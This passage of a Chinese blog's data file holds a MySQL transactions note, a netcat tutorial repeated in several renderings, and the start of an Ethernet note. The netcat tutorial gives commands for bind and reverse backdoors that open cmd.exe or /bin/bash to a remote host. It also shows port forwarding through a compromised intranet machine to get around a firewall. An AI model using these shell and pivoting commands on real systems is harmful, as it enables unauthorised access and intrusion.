alt=\"NBXYjO.png\"></p>\n<ol start=\"3\">\n<li>事务的创建</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBX89x.png\" alt=\"NBX89x.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXNuD.png\" alt=\"NBXNuD.png\"></p>\n<ul>\n<li>实例</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXG36.png\" alt=\"NBXG36.png\"></p>\n<ol start=\"5\">\n<li>事务隔离级别</li>\n</ol>\n<p><img src=\"/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200626215014414.png\" alt=\"image-20200626215014414\"></p>\n<p><img src=\"/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200627183401294.png\" alt=\"image-20200627183401294\"></p>\n<ul>\n<li>MySQL中默认隔离级别 repeatable read</li>\n<li>oracle中默认级别 read committed</li>\n<li>查看隔离级别 ：select @@tx_isolation;</li>\n<li>设置隔离级别 ：</li>\n</ul>\n<pre><code>set session 或 global transaction isolation level 隔离级别；</code></pre><ol start=\"6\">\n<li>savepoint 节点名，设置保存点</li>\n</ol>\n<pre><code># 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有</code></pre>"},{"title":"netcat使用","date":"2020-10-20T00:46:40.000Z","comments":1,"_content":"\n## netcat命令选项\n\n#### 本文参考文章链接\n\n[本文参考文章链接1](https://www.fujieace.com/linux/nc-2.html)\n\n[本文参考文章链接2](https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html)\n\n[本文参考文章链接3](https://www.cnblogs.com/lpfuture/p/5719066.html)\n\n<!--more-->\n\n### 常用命令选项\n\n```\n## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态\n```\n\n### 基本全部命令选项\n\n```\n用法：\n\nncat [选项] [主机名] [端口]\n\n \n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n \n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n \n\n-U, --unixsock 仅使用Unix域套接字\n\n\t--vsock 仅使用vsock套接字\n\n \n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec <command> 通过/bin/sh执行给定命令\n\n-e, --exec <command> 执行给定命令\n\n\t--lua-exec <filename> 执行给定的Lua脚本\n\n \n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G <n> 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns <n> 最大<n>同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay <time> 在读/写之间等待时间\n\n-o, --output <filename> 将会话数据转储到文件中\n\n-x, --hex-dump <filename> 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout <time> 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n\t--sctp 使用SCTP代替默认TCP\n\n \n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait <time> 连接超时时间\n\n \n\n-z   零I/O模式，仅报告连接状态\n\n    \n```\n\n\n\n## 1. 模拟聊天\n\n- 服务器\n\n```\nnc -l -p [端口号]\n```\n\n- 客户端\n\n```\nnc [服务器ip] [服务器端口]\n```\n\n\n\n## 2.Banner抓取方法\n\n- Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。\n\n```\necho \"\" | nc -v -n w1 [target_ip] [开始端口-结束端口]\n```\n\n\n\n## 3.文件传输\n\n### 从客户端传输文件到服务器\n\n- 服务器\n\n```\nnc -l -p [端口号] > out_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] < in_flimename\n```\n\n### 从服务器传输文件到客户端\n\n- 服务器\n\n```\nnc -l -p [端口号] < in_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] > out_flimename\n```\n\n\n\n## 4.目录传输（与文件传输类似）\n\n- 服务器\n\n```\ntar -cvf - dir_name | nc -l [port_id]\n```\n\n- 客户端\n\n```\nnc -n [target_ip] [target_port] | tar -xvf - \n```\n\n\n\n##  5. windows建立后门的方法\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e cmd.exe\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e cmd.exe\n```\n\n\n\n## 6、Linux下建立后门\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e /bin/bash\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e /bin/bash\n```\n\n\n\n## 7、连接转发\n\n- 可以解决的问题\n\n1. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。\n\n```\n'''\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n'''\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]\n```\n\n2. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。\n\n```\n## 原理同上\n```\n\n\n\n## 8、反弹shell\n\n[![BFDrmd.md.png](https://s1.ax1x.com/2020/10/22/BFDrmd.md.png)](https://imgchr.com/i/BFDrmd)\n\n\n\n","source":"_posts/瑞士军刀.md","raw":"---\ntitle: netcat使用\ndate: 2020/10/20 8:46:40\ncomments: ture\ncategories:\n- 网络安全\ntags:\n- 黑客技术\n---\n\n## netcat命令选项\n\n#### 本文参考文章链接\n\n[本文参考文章链接1](https://www.fujieace.com/linux/nc-2.html)\n\n[本文参考文章链接2](https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html)\n\n[本文参考文章链接3](https://www.cnblogs.com/lpfuture/p/5719066.html)\n\n<!--more-->\n\n### 常用命令选项\n\n```\n## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态\n```\n\n### 基本全部命令选项\n\n```\n用法：\n\nncat [选项] [主机名] [端口]\n\n \n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n \n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n \n\n-U, --unixsock 仅使用Unix域套接字\n\n\t--vsock 仅使用vsock套接字\n\n \n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec <command> 通过/bin/sh执行给定命令\n\n-e, --exec <command> 执行给定命令\n\n\t--lua-exec <filename> 执行给定的Lua脚本\n\n \n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G <n> 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns <n> 最大<n>同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay <time> 在读/写之间等待时间\n\n-o, --output <filename> 将会话数据转储到文件中\n\n-x, --hex-dump <filename> 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout <time> 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n\t--sctp 使用SCTP代替默认TCP\n\n \n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait <time> 连接超时时间\n\n \n\n-z   零I/O模式，仅报告连接状态\n\n    \n```\n\n\n\n## 1. 模拟聊天\n\n- 服务器\n\n```\nnc -l -p [端口号]\n```\n\n- 客户端\n\n```\nnc [服务器ip] [服务器端口]\n```\n\n\n\n## 2.Banner抓取方法\n\n- Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。\n\n```\necho \"\" | nc -v -n w1 [target_ip] [开始端口-结束端口]\n```\n\n\n\n## 3.文件传输\n\n### 从客户端传输文件到服务器\n\n- 服务器\n\n```\nnc -l -p [端口号] > out_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] < in_flimename\n```\n\n### 从服务器传输文件到客户端\n\n- 服务器\n\n```\nnc -l -p [端口号] < in_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] > out_flimename\n```\n\n\n\n## 4.目录传输（与文件传输类似）\n\n- 服务器\n\n```\ntar -cvf - dir_name | nc -l [port_id]\n```\n\n- 客户端\n\n```\nnc -n [target_ip] [target_port] | tar -xvf - \n```\n\n\n\n##  5. windows建立后门的方法\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e cmd.exe\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e cmd.exe\n```\n\n\n\n## 6、Linux下建立后门\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e /bin/bash\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e /bin/bash\n```\n\n\n\n## 7、连接转发\n\n- 可以解决的问题\n\n1. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。\n\n```\n'''\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n'''\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]\n```\n\n2. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。\n\n```\n## 原理同上\n```\n\n\n\n## 8、反弹shell\n\n[![BFDrmd.md.png](https://s1.ax1x.com/2020/10/22/BFDrmd.md.png)](https://imgchr.com/i/BFDrmd)\n\n\n\n","slug":"瑞士军刀","published":1,"updated":"2021-03-24T04:15:01.829Z","layout":"post","photos":[],"link":"","_id":"ckq3bl42p0019dsvtcgwf0em8","content":"<h2 id=\"netcat命令选项\"><a href=\"#netcat命令选项\" class=\"headerlink\" title=\"netcat命令选项\"></a>netcat命令选项</h2><h4 id=\"本文参考文章链接\"><a href=\"#本文参考文章链接\" class=\"headerlink\" title=\"本文参考文章链接\"></a>本文参考文章链接</h4><p><a href=\"https://www.fujieace.com/linux/nc-2.html\">本文参考文章链接1</a></p>\n<p><a href=\"https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html\">本文参考文章链接2</a></p>\n<p><a href=\"https://www.cnblogs.com/lpfuture/p/5719066.html\">本文参考文章链接3</a></p>\n<span id=\"more\"></span>\n\n<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><pre><code>## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</code></pre><h3 id=\"基本全部命令选项\"><a href=\"#基本全部命令选项\" class=\"headerlink\" title=\"基本全部命令选项\"></a>基本全部命令选项</h3><pre><code>用法：\n\nncat [选项] [主机名] [端口]\n\n\n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n\n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n\n\n-U, --unixsock 仅使用Unix域套接字\n\n    --vsock 仅使用vsock套接字\n\n\n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令\n\n-e, --exec &lt;command&gt; 执行给定命令\n\n    --lua-exec &lt;filename&gt; 执行给定的Lua脚本\n\n\n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay &lt;time&gt; 在读/写之间等待时间\n\n-o, --output &lt;filename&gt; 将会话数据转储到文件中\n\n-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n    --sctp 使用SCTP代替默认TCP\n\n\n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait &lt;time&gt; 连接超时时间\n\n\n\n-z   零I/O模式，仅报告连接状态\n\n</code></pre><h2 id=\"1-模拟聊天\"><a href=\"#1-模拟聊天\" class=\"headerlink\" title=\"1. 模拟聊天\"></a>1. 模拟聊天</h2><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号]</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [服务器ip] [服务器端口]</code></pre><h2 id=\"2-Banner抓取方法\"><a href=\"#2-Banner抓取方法\" class=\"headerlink\" title=\"2.Banner抓取方法\"></a>2.Banner抓取方法</h2><ul>\n<li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li>\n</ul>\n<pre><code>echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</code></pre><h2 id=\"3-文件传输\"><a href=\"#3-文件传输\" class=\"headerlink\" title=\"3.文件传输\"></a>3.文件传输</h2><h3 id=\"从客户端传输文件到服务器\"><a href=\"#从客户端传输文件到服务器\" class=\"headerlink\" title=\"从客户端传输文件到服务器\"></a>从客户端传输文件到服务器</h3><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号] &gt; out_filename</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [目标IP] [目标端口] &lt; in_flimename</code></pre><h3 id=\"从服务器传输文件到客户端\"><a href=\"#从服务器传输文件到客户端\" class=\"headerlink\" title=\"从服务器传输文件到客户端\"></a>从服务器传输文件到客户端</h3><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号] &lt; in_filename</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [目标IP] [目标端口] &gt; out_flimename</code></pre><h2 id=\"4-目录传输（与文件传输类似）\"><a href=\"#4-目录传输（与文件传输类似）\" class=\"headerlink\" title=\"4.目录传输（与文件传输类似）\"></a>4.目录传输（与文件传输类似）</h2><ul>\n<li>服务器</li>\n</ul>\n<pre><code>tar -cvf - dir_name | nc -l [port_id]</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc -n [target_ip] [target_port] | tar -xvf - </code></pre><h2 id=\"5-windows建立后门的方法\"><a href=\"#5-windows建立后门的方法\" class=\"headerlink\" title=\"5. windows建立后门的方法\"></a>5. windows建立后门的方法</h2><h3 id=\"服务器——监听型后门\"><a href=\"#服务器——监听型后门\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e cmd.exe</code></pre><h3 id=\"客户端——连接型后门\"><a href=\"#客户端——连接型后门\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e cmd.exe</code></pre><h2 id=\"6、Linux下建立后门\"><a href=\"#6、Linux下建立后门\" class=\"headerlink\" title=\"6、Linux下建立后门\"></a>6、Linux下建立后门</h2><h3 id=\"服务器——监听型后门-1\"><a href=\"#服务器——监听型后门-1\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e /bin/bash</code></pre><h3 id=\"客户端——连接型后门-1\"><a href=\"#客户端——连接型后门-1\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e /bin/bash</code></pre><h2 id=\"7、连接转发\"><a href=\"#7、连接转发\" class=\"headerlink\" title=\"7、连接转发\"></a>7、连接转发</h2><ul>\n<li>可以解决的问题</li>\n</ul>\n<ol>\n<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li>\n</ol>\n<pre><code>&#39;&#39;&#39;\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n&#39;&#39;&#39;\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]</code></pre><ol start=\"2\">\n<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li>\n</ol>\n<pre><code>## 原理同上</code></pre><h2 id=\"8、反弹shell\"><a href=\"#8、反弹shell\" class=\"headerlink\" title=\"8、反弹shell\"></a>8、反弹shell</h2><p><a href=\"https://imgchr.com/i/BFDrmd\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/10/22/BFDrmd.md.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"BFDrmd.md.png\"></a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"netcat命令选项\"><a href=\"#netcat命令选项\" class=\"headerlink\" title=\"netcat命令选项\"></a>netcat命令选项</h2><h4 id=\"本文参考文章链接\"><a href=\"#本文参考文章链接\" class=\"headerlink\" title=\"本文参考文章链接\"></a>本文参考文章链接</h4><p><a href=\"https://www.fujieace.com/linux/nc-2.html\">本文参考文章链接1</a></p>\n<p><a href=\"https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html\">本文参考文章链接2</a></p>\n<p><a href=\"https://www.cnblogs.com/lpfuture/p/5719066.html\">本文参考文章链接3</a></p>","more":"<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><pre><code>## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</code></pre><h3 id=\"基本全部命令选项\"><a href=\"#基本全部命令选项\" class=\"headerlink\" title=\"基本全部命令选项\"></a>基本全部命令选项</h3><pre><code>用法：\n\nncat [选项] [主机名] [端口]\n\n\n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n\n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n\n\n-U, --unixsock 仅使用Unix域套接字\n\n    --vsock 仅使用vsock套接字\n\n\n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令\n\n-e, --exec &lt;command&gt; 执行给定命令\n\n    --lua-exec &lt;filename&gt; 执行给定的Lua脚本\n\n\n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay &lt;time&gt; 在读/写之间等待时间\n\n-o, --output &lt;filename&gt; 将会话数据转储到文件中\n\n-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n    --sctp 使用SCTP代替默认TCP\n\n\n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait &lt;time&gt; 连接超时时间\n\n\n\n-z   零I/O模式，仅报告连接状态\n\n</code></pre><h2 id=\"1-模拟聊天\"><a href=\"#1-模拟聊天\" class=\"headerlink\" title=\"1. 模拟聊天\"></a>1. 模拟聊天</h2><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号]</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [服务器ip] [服务器端口]</code></pre><h2 id=\"2-Banner抓取方法\"><a href=\"#2-Banner抓取方法\" class=\"headerlink\" title=\"2.Banner抓取方法\"></a>2.Banner抓取方法</h2><ul>\n<li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li>\n</ul>\n<pre><code>echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</code></pre><h2 id=\"3-文件传输\"><a href=\"#3-文件传输\" class=\"headerlink\" title=\"3.文件传输\"></a>3.文件传输</h2><h3 id=\"从客户端传输文件到服务器\"><a href=\"#从客户端传输文件到服务器\" class=\"headerlink\" title=\"从客户端传输文件到服务器\"></a>从客户端传输文件到服务器</h3><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号] &gt; out_filename</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [目标IP] [目标端口] &lt; in_flimename</code></pre><h3 id=\"从服务器传输文件到客户端\"><a href=\"#从服务器传输文件到客户端\" class=\"headerlink\" title=\"从服务器传输文件到客户端\"></a>从服务器传输文件到客户端</h3><ul>\n<li>服务器</li>\n</ul>\n<pre><code>nc -l -p [端口号] &lt; in_filename</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc [目标IP] [目标端口] &gt; out_flimename</code></pre><h2 id=\"4-目录传输（与文件传输类似）\"><a href=\"#4-目录传输（与文件传输类似）\" class=\"headerlink\" title=\"4.目录传输（与文件传输类似）\"></a>4.目录传输（与文件传输类似）</h2><ul>\n<li>服务器</li>\n</ul>\n<pre><code>tar -cvf - dir_name | nc -l [port_id]</code></pre><ul>\n<li>客户端</li>\n</ul>\n<pre><code>nc -n [target_ip] [target_port] | tar -xvf - </code></pre><h2 id=\"5-windows建立后门的方法\"><a href=\"#5-windows建立后门的方法\" class=\"headerlink\" title=\"5. windows建立后门的方法\"></a>5. windows建立后门的方法</h2><h3 id=\"服务器——监听型后门\"><a href=\"#服务器——监听型后门\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e cmd.exe</code></pre><h3 id=\"客户端——连接型后门\"><a href=\"#客户端——连接型后门\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e cmd.exe</code></pre><h2 id=\"6、Linux下建立后门\"><a href=\"#6、Linux下建立后门\" class=\"headerlink\" title=\"6、Linux下建立后门\"></a>6、Linux下建立后门</h2><h3 id=\"服务器——监听型后门-1\"><a href=\"#服务器——监听型后门-1\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e /bin/bash</code></pre><h3 id=\"客户端——连接型后门-1\"><a href=\"#客户端——连接型后门-1\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e /bin/bash</code></pre><h2 id=\"7、连接转发\"><a href=\"#7、连接转发\" class=\"headerlink\" title=\"7、连接转发\"></a>7、连接转发</h2><ul>\n<li>可以解决的问题</li>\n</ul>\n<ol>\n<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li>\n</ol>\n<pre><code>&#39;&#39;&#39;\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n&#39;&#39;&#39;\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]</code></pre><ol start=\"2\">\n<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li>\n</ol>\n<pre><code>## 原理同上</code></pre><h2 id=\"8、反弹shell\"><a href=\"#8、反弹shell\" class=\"headerlink\" title=\"8、反弹shell\"></a>8、反弹shell</h2><p><a href=\"https://imgchr.com/i/BFDrmd\"><img src=\"https://s1.ax1x.com/2020/10/22/BFDrmd.md.png\" alt=\"BFDrmd.md.png\"></a></p>"},{"title":"tcp/ip","date":"2020-05-03T01:08:28.000Z","comments":1,"_content":"# 网络协议\n\n[相关博客](http://blog.sina.com.cn/s/blog_52ddfea30100nssx.html)\n\n## 以太网\n\n### 以太网术语\n\n以太网遵循一组控制其基本操作的简单规则。为了更好地理解这些规则，了解基本的以太网术语十分重要。 \n\n1. 介质——以太网设备连接到一个公共介质上，该介质为电气信号的传输提供了一条路径。历史上一直使用同轴铜电缆作为传输介质，但是目前双绞线或光纤更为多见。 \n2. 网段——我们将单个共享介质称作一个以太网段。 \n3. 节点——连接到网段的设备称作站点或节点。 \n4. 帧——节点使用称作帧的简短消息进行通信，帧是大小不固定的信息块。 